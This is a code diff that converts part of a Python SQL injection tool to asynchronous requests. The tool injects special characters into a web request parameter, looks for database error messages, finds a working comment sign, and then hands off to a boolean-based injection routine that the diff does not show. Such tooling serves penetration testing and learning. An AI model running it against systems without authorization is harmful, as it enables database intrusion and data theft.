@@ -53,7 +53,7 @@ def get_request_copy(request):
     return new_request
 
 
-def find_sqli(request, parameter):
+async def find_sqli(request, parameter, session):
     """
     checks if the parameter given is sqli vulnerable by sending multiple requests to the server with different special
     characters and checking whether the response contains an error message
@@ -62,15 +62,16 @@ def find_sqli(request, parameter):
     :return: the character causing the error, or NOT_DETECTED string if no error was caused
     """
     for char in SQLI_CHARS:
-        response = send_sql_request(request, parameter, char)
+        response = await send_sql_request(request, parameter, char, session)
+        response_text = await response.text()
         for error_msg in SQL_ERRORS:
-            if error_msg in response.text.lower():
+            if error_msg in response_text.lower():
                 print(SQLI_DETECTED_MSG)
                 return char
     print(SQLI_NOT_DETECTED_MSG)
     return NOT_DETECTED
 
-def find_comment_sign(request, parameter):
+async def find_comment_sign(request, parameter, session):
     """
     checks which char is valid as a comment starter
     :param request: a HTTPRequest object whose data we will change and send
@@ -78,25 +79,31 @@ def find_comment_sign(request, parameter):
     :return: the character marking a comment, or NOT_DETECTED string if no error was caused
     """
     for sign in SQL_COMMENTS:
-        response = send_sql_request(request, parameter, APOSTROPHE + sign)
+        response = await send_sql_request(request, parameter, APOSTROPHE + sign, session)
         for error_msg in SQL_ERRORS:
-            if error_msg not in response.text.lower():
+            response_text = await response.text()
+            if error_msg not in response_text.lower():
                 return sign
     print(SQLI_NO_COMMENT_SIGN_DETECTED)
     return NOT_DETECTED
 
 
-
-
-if __name__ == '__main__':
+async def main():
     origin_request = parse_request_file("C:\\Users\\Amit\\Downloads\\request.txt")
     parameter = "username"
     request = get_request_copy(origin_request)
-    is_there_sqli = find_sqli(request, parameter)
-    if is_there_sqli == NOT_DETECTED:
-        exit(0)
-    comment = find_comment_sign(request, parameter)
-    if comment == NOT_DETECTED:
-        exit(0)
-    boolean_based_injection(request, parameter, comment)
+    async with aiohttp.ClientSession() as session:
+        is_there_sqli = await find_sqli(request, parameter, session)
+        if is_there_sqli == NOT_DETECTED:
+            exit(0)
+        comment = await find_comment_sign(request, parameter, session)
+        if comment == NOT_DETECTED:
+            exit(0)
+        await boolean_based_injection(request, parameter, comment, session)
+
+
+if __name__ == '__main__':
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(main())
+    loop.close()
 
